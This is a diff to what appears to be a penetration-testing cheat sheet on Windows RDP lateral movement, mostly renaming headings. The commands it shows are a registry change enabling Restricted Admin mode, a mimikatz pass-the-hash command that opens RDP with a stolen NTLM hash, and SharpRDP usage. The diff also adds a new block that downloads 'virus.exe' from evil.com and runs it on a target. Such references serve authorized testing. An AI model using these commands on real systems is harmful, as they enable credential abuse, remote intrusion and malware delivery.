@@ -2,8 +2,6 @@
 
 ## Windows RDP
 
-### Remote Desktop
-
 {% hint style="info" %}
 /admin allows to not disconnect connected user
 {% endhint %}
@@ -12,7 +10,7 @@
  mstsc.exe /admin
 ```
 
-#### Restricted Admin
+### Restricted Admin
 
 Allow to use the current user credentials session to make a network connection without entering a password.
 
@@ -26,7 +24,7 @@ New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name Disabl
  mstsc.exe /restrictedadmin 
 ```
 
-#### Using mimikatz
+### Using mimikatz
 
 ```csharp
 sekurlsa::pth /user:admin /domain:domain /ntlm:<NTLM HASH> /run:"mstsc.exe /restrictedadmin"
@@ -34,12 +32,18 @@ sekurlsa::pth /user:admin /domain:domain /ntlm:<NTLM HASH> /run:"mstsc.exe /rest
 
 ## SharpRDP
 
-#### RDP in console
+### RDP in console
 
 ```csharp
 SharpRDP.exe computername=target command=notepad username=domain\user password=password!
+```
 
+#### Remote code Execution
 
+```text
+sharprdp.exe computername=target command="powershell (New-Object
+System.Net.WebClient).DownloadFile('http://evil.com/virus.exe',
+'C:\Windows\Tasks\virus.exe'); C:\Windows\Tasks\virus.exe" username=domain\user password=password!
 ```
 
 
